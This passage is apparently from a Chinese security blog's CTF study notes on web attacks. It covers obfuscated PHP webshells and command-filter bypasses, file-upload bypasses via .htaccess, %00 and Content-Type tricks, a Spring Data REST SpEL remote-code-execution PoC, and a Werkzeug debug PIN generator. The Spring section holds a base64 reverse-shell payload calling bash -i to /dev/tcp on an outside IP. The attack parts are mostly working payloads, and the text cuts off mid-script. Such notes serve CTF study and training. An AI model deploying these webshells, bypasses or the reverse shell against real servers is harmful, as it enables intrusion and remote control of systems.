class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=<span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line">固定格式 构造出来的 <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[_]);</span><br><span class="line">然后post传入   _=<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5）利用UTF-8编码进行异或绕过-使用post传参数​2-system-cat-zheshiflag-php-。​"><a href="#5）利用UTF-8编码进行异或绕过-使用post传参数​2-system-cat-zheshiflag-php-。​" class="headerlink" title="5）利用UTF-8编码进行异或绕过,使用post传参数​2=system(&#39;cat zheshiflag.php &#39;)。​"></a>5）<strong>利用UTF-8编码进行异或绕过,使用post传参数</strong>​<code>2=system(&#39;cat zheshiflag.php &#39;)。</code>​</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url?a=<span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;的&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;半&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;始&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$___</span>=<span class="string">&quot;俯&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;次&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;站&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_____</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20231015100334-3qcjdcw.png" class="" title="image">​

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">除这些之外我们还可以这样用`<span class="variable">$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;</span>&#123;%86&#125;();&amp;%86=phpinfo`​其中`<span class="string">&quot;%86%86%86%86^%d9%c1%c3%d2&quot;</span>`​为构造出的`_GET`​，适合于过滤了引号的情况下使用。</span><br></pre></td></tr></table></figure>



<h2 id="5-一句话木马中的-被过滤"><a href="#5-一句话木马中的-被过滤" class="headerlink" title="5.一句话木马中的?被过滤"></a>5.一句话木马中的?被过滤</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls /&quot;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="6-将文件上传的文件名进行随机化"><a href="#6-将文件上传的文件名进行随机化" class="headerlink" title="6.将文件上传的文件名进行随机化"></a>6.将文件上传的文件名进行随机化</h2><p>可以利用文件上传+文件包含读取flag</p>
<img src="/2023/10/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20231018103852-5tjnm7a.png" class="" title="image">​

<h2 id="7-命令联合执行"><a href="#7-命令联合执行" class="headerlink" title="7.命令联合执行"></a>7.命令联合执行</h2><p>;     前面的执行完执行后面的<br>|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）</p>
<p>||    当前面的执行出错时（为假）执行后面的<br>&amp;     将任务置于后台执行<br>&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真<br>%0a  （换行）<br>%0d  （回车）</p>
<p>‍</p>
<h2 id="8-反引号"><a href="#8-反引号" class="headerlink" title="8.反引号&#96;"></a>8.反引号&#96;</h2><p>内联，就是将反引号内命令的输出作为输入执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;cat$IFS$<span class="number">9</span>`ls`</span><br><span class="line"></span><br><span class="line"><span class="variable">$IFS</span>在Linux下表示为空格</span><br><span class="line">$<span class="number">9</span>是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字</span><br><span class="line"></span><br><span class="line">这里$IFS$<span class="number">9</span>或<span class="variable">$IFS</span>垂直，后面加个$与&#123;&#125;类似，起截断作用</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="9-flag过滤"><a href="#9-flag过滤" class="headerlink" title="9.flag过滤"></a>9.flag过滤</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span>$IFS$<span class="number">1</span>Y2F0IGZsYWcucGhw|base64$IFS$<span class="number">1</span>-d|sh     <span class="comment">#sh是执行echo后面的解码内容</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=ag;b=fl;cat $b<span class="variable">$a</span>;   <span class="comment">#注意有时候需要将ab的顺便倒置才能getshell</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cat fl*  用*匹配任意 </span><br><span class="line">cat fla* 用*匹配任意</span><br><span class="line">ca\t fla\g.php        反斜线绕过</span><br><span class="line">cat fl<span class="string">&#x27;&#x27;</span>ag.php        两个单引号绕过</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Y2F0IGZsYWcucGhw&quot;</span> | base64 -d | bash    </span><br><span class="line"><span class="comment">//base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;63617420666c61672e706870&quot;</span> | xxd -r -p | bash     </span><br><span class="line"><span class="comment">//hex编码绕过(引号可以去掉)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;63617420666c61672e706870&quot;</span> | xxd -r -p | sh   </span><br><span class="line"><span class="comment">//sh的效果和bash一样</span></span><br><span class="line"></span><br><span class="line">cat fl[a]g.php       用[]匹配</span><br><span class="line"></span><br><span class="line">a=fl;b=ag;cat $a<span class="variable">$b</span>          变量替换</span><br><span class="line">cp fla&#123;g.php,G&#125;    把flag.php复制为flaG</span><br><span class="line">ca$&#123;<span class="number">21</span>&#125;t a.txt     利用空变量  使用$*和$@，<span class="variable">$x</span>(x 代表 <span class="number">1</span>-<span class="number">9</span>),$&#123;x&#125;(x&gt;=<span class="number">10</span>)(小于 <span class="number">10</span> 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>文件上传</title>
    <url>/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>一句话木马</p>
<p><code>&lt;?php @eval($_POST[&#39;hacker&#39;]); ?&gt;</code>​</p>
<p>‍</p>
<p>curl -d “hacker&#x3D;echo get_current_user();  “ <a href="http://192.168.149.136:88/images/shell.php">http://192.168.149.136:88/images/shell.php</a></p>
<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230921222850-iav35be.png" class="" title="image">​

<p>‍</p>
<p>curl -d “hacker&#x3D;echo getcwd();” <a href="http://192.168.149.136:88/images/shell.php">http://192.168.149.136:88/images/shell.php</a></p>
<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230921223027-rov5lta.png" class="" title="image">​

<p>‍</p>
<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230921223627-ul05tbu.png" class="" title="image">​

<p>后缀名绕过</p>
<p>黑名单</p>
<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230921225519-3uynb9d.png" class="" title="image">​

<p>‍</p>
<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230921224801-ynsbc1e.png" class="" title="image">​

<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230921225647-simjsf6.png" class="" title="image">​

<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230921225725-sdndkng.png" class="" title="image">​

<p>php30被解析为文本文件。</p>
<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230921230007-z28jj90.png" class="" title="image">​

<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230921230310-gn6w9u6.png" class="" title="image">​

<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230921230356-8rjvey1.png" class="" title="image">​

<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230921230415-m1ctnki.png" class="" title="image">

<p>或者</p>
<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230924143449-om32ngn.png" class="" title="image">​

<p>Burpsuite抓取到的数据包，将Content-Type的类型改为允许上传的类型—&gt; image&#x2F;jpeg，然后再方放行数据包（forward），显示shell1.php文件上传成功。</p>
<h2 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h2><p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、 禁止目录列表、配置默认文档等功能</p>
<p>Unix、Linux系统或者是任何版本的Apache Web服务器都是支持.htaccess的，但是有的主机服务商可能不允许你自定义自己的.htaccess<br> 文件。</p>
<p>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230923101635-v3v1w3r.png" class="" title="image">

<p>第一种：所有文件都会被解析成php代码执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;IfModule &gt;</span><br><span class="line">setHandler application/x-httpd-php </span><br><span class="line">&lt;/IfModule &gt; </span><br></pre></td></tr></table></figure>

<p>第二种：将jpg文件解析为php代码执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;\.jpg&quot;</span>&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>第三种：精确</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;1.png&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php   <span class="comment">#在当前目录下，如果匹配到1.png文件，则被解析成PHP代码执行</span></span><br><span class="line">AddHandler php5-script .png          <span class="comment">#在当前目录下，如果匹配到1.png文件，则被解析成PHP代码执行</span></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#define width 1337                </span></span><br><span class="line"><span class="comment">#define height 1337                   </span></span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-php .png </span><br><span class="line"></span><br><span class="line">php_value zend.multibyte <span class="number">1</span>            </span><br><span class="line">php_value zend.detect_unicode <span class="number">1</span>       </span><br><span class="line">php_value display_errors <span class="number">1</span> </span><br></pre></td></tr></table></figure>

<h2 id="对"><a href="#对" class="headerlink" title="对&lt;?过滤的绕过姿势"></a>对&lt;?过滤的绕过姿势</h2><p>可以用utf-16编码绕过</p>
<p>第一步：</p>
<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20231015121447-98c66s8.png" class="" title="image">​

<p>第二步：</p>
<p>新建一个文件，用winhex写入数据即可。</p>
<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20231015121624-8ycwu9b.png" class="" title="image">​

<p>‍</p>
<p>‍</p>
<h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230923101736-u992w81.png" class="" title="image">​

<p>windows 大小写通用</p>
<p>linux大小写敏感</p>
<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230923102126-rdxqq27.png" class="" title="image">​

<h2 id="Windows文件流特性绕过"><a href="#Windows文件流特性绕过" class="headerlink" title="Windows文件流特性绕过"></a>Windows文件流特性绕过</h2><img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230923102520-egbdn4v.png" class="" title="image">​

<h2 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="%00截断绕过"></a>%00截断绕过</h2><img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230923102827-bb6ibyv.png" class="" title="image">​

<p>例题：</p>
<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230923110851-hyku4nz.png" class="" title="image">​

<p>抓包</p>
<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230923110923-h2r9i4x.png" class="" title="image">​

<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230923111104-p020d3u.png" class="" title="image">​

<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230923111351-vithw3a.png" class="" title="image">​

<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230923111418-i2t60uq.png" class="" title="image">​

<p>成功修改，放行</p>
<h2 id="文件头检测绕过"><a href="#文件头检测绕过" class="headerlink" title="文件头检测绕过"></a>文件头检测绕过</h2><img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230924113453-o7ao6lw.png" class="" title="image">​

<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230924133631-5vs7rkr.png" class="" title="image">​

<p>‍</p>
<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230924140210-ytlpc0d.png" class="" title="image">​

<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230924141241-6gc49dd.png" class="" title="image">​

<p>‍</p>
<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230924141525-n76imei.png" class="" title="image">​

<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230924142537-aw08bxh.png" class="" title="image">​

<p>‍</p>
<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230924142853-89r9iqj.png" class="" title="image">​

<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230924142605-pfciq3e.png" class="" title="image">​

<img src="/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230924142736-emzkc58.png" class="" title="image">​

<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>框架安全</title>
    <url>/2023/10/23/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="框架安全"><a href="#框架安全" class="headerlink" title="框架安全"></a>框架安全</h1><img src="/2023/10/23/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20231007094306-b5q5dk7.png" class="" title="image">​

<img src="/2023/10/23/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20231007094428-09zr4d3.png" class="" title="image">​

<img src="/2023/10/23/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20231007094501-q5co8bc.png" class="" title="image">​

<h2 id="1-Spring框架漏洞"><a href="#1-Spring框架漏洞" class="headerlink" title="1.Spring框架漏洞"></a>1.Spring框架漏洞</h2><img src="/2023/10/23/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20231007094629-auz74yh.png" class="" title="image">​

<img src="/2023/10/23/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20231007095355-v20wkfp.png" class="" title="image">​

<img src="/2023/10/23/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20231007095901-e0sqby6.png" class="" title="image">​

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">curl -X POST -H <span class="string">&quot;Content-Type:application/json-patch+json&quot;</span> -d </span><br><span class="line"><span class="string">&#x27;&#123;&quot;firstname&quot;:&quot;si&quot;,&quot;lastname&quot;:&quot;Li&quot;&#125;&#x27;</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span>/customers</span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20231007100245-rtfcofi.png" class="" title="image">​

<img src="/2023/10/23/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20231007100341-jjmdov3.png" class="" title="image">​

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">curl -X DELETE -H <span class="string">&quot;Content-Type:application/json-patch+json&quot;</span> -d </span><br><span class="line"><span class="string">&#x27;&#123;&quot;firstname&quot;:&quot;si&quot;,&quot;lastname&quot;:&quot;Li&quot;&#125;&#x27;</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span>/customers/<span class="number">2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20231007100724-d6g43dg.png" class="" title="image">​

<img src="/2023/10/23/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20231007100736-wfu56q1.png" class="" title="image">​

<img src="/2023/10/23/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20231007100926-72fbjso.png" class="" title="image">​

<img src="/2023/10/23/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20231007101111-ioasmqu.png" class="" title="image">​

<img src="/2023/10/23/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20231007142103-znbarlj.png" class="" title="image">​

<p>修改后：</p>
<p>poc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[&#123; <span class="string">&quot;op&quot;</span>: <span class="string">&quot;replace&quot;</span>, <span class="string">&quot;path&quot;</span>: </span><br><span class="line"><span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(</span></span><br><span class="line"><span class="string">new byte[]&#123;116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115&#125;))/lastname&quot;</span>, </span><br><span class="line"><span class="string">&quot;value&quot;</span>: <span class="string">&quot;vulhub&quot;</span> &#125;]</span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20231007150013-qh9xfcz.png" class="" title="image">​

<p>其中new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}表示的命令touch &#x2F;tmp&#x2F;success<br>这是将每个字符转为对应的十进制，可以通过下面的python代码进行转换：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;touch /tmp/success&#x27;</span></span><br><span class="line">bytecode = <span class="string">&#x27;,&#x27;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>(payload))</span><br><span class="line"><span class="built_in">print</span>(bytecode)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>反弹shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[&#123; <span class="string">&quot;op&quot;</span>: <span class="string">&quot;replace&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(</span></span><br><span class="line"><span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjE0MC41MC4xNjQvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)/lastname&quot;</span>, </span><br><span class="line"><span class="string">&quot;value&quot;</span>: <span class="string">&quot;vulhub&quot;</span> &#125;]</span><br></pre></td></tr></table></figure>

<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;8.140.50.164&#x2F;7777 0&gt;&amp;1</p>
<p>base64编码：YmFzaCAtaSA+JiAvZGV2L3RjcC84LjE0MC41MC4xNjQvNzc3NyAwPiYx</p>
<img src="/2023/10/23/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20231007145843-b320hw8.png" class="" title="image">​

<img src="/2023/10/23/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20231007145905-9252br5.png" class="" title="image">​

<img src="/2023/10/23/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20231007151046-nlf93k6.png" class="" title="image">​

<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/Python/flask/</url>
    <content><![CDATA[<h1 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h1><h2 id="1-debug——PIN"><a href="#1-debug——PIN" class="headerlink" title="1.debug——PIN"></a>1.debug——PIN</h2><p>考点：最新版本werkzeugd下的flask_pin码的求值</p>
<p>Flask debug pin的安全问题详细分析参考看<a href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a>，且大佬也给出了利用脚本。需要重点关注的也就是6个参数</p>
<p>‍</p>
<p><strong>username 启动这个Flask的用户</strong></p>
<p><strong>modname 一般默认flask.app</strong></p>
<p><strong>getattr(app, ‘name’, getattr(app.class, ‘name‘)) 一般默认flask.app为Flask</strong></p>
<p><strong>getattr(mod, ‘file’, None)为flask目录下的一个app.py的绝对路径,可在报错页面看到</strong></p>
<p><strong>str(uuid.getnode()) 则是网卡mac地址的十进制表达式</strong></p>
<p><strong>get_machine_id() 系统id</strong></p>
<p>‍</p>
<p>由于pin码构建需要这6个参数，但不同环境下，参数会有变化，除了默认不变的参数，其他参数我们可以这样获得：</p>
<p><strong>username</strong></p>
<p>可以从&#x2F;etc&#x2F;passwd或者&#x2F;proc&#x2F;self&#x2F;environ环境变量中读取</p>
<p><strong>网卡地址</strong></p>
<p>读取这两个地址：&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address或&#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address</p>
<p><strong>getattr(mod, ‘file’, None)</strong></p>
<p>flask目录下的一个app.py的<strong>绝对路径</strong>,这个值可以在报错页面看到。但有个坑，python3是app.py，python2中是app.pyc</p>
<p><strong>machine_id()</strong></p>
<p>linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i</p>
<p>windows读取注册表中的HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography</p>
<p>对于docker机则读取读取&#x2F;proc&#x2F;self&#x2F;cgroup获取get_machine_id()(docker后面那段字符串)：</p>
<p>​<img src="/assets/wps1-20231017104858-k8gscqp.jpg">​</p>
<p>但是注意的是Flask下的werzeug版本在在2020年1月5号就发生了更新，代码发生了变化，因此要再读取到machine_id()的值的话需要先读取&#x2F;etc&#x2F;machine-id，再读取&#x2F;proc&#x2F;self&#x2F;cgroup，并将第一个获取到的值与第二个获取到的id值进行拼接</p>
<p>详细文章说明：<a href="https://cloud.tencent.com/developer/article/1657739">https://cloud.tencent.com/developer/article/1657739</a></p>
<p>当然如果指定了Werkzeug版本就可以避免该情况</p>
<p>Flask&#x3D;&#x3D;1.0.2</p>
<p>Werkzeug&#x3D;&#x3D;0.14.1</p>
<p>就可以像网上很多文章所写的一样可以正常构造了。至于对于我们这道题就只能是拼接出machine_id了。最终POC如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.5/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485376923487&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;c31eea55a29431535ff01de94bdcf5cf415fe597d35eb4e23fd2a991b6d2225599f4e20039e85b0f7d83e706215e8054&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span 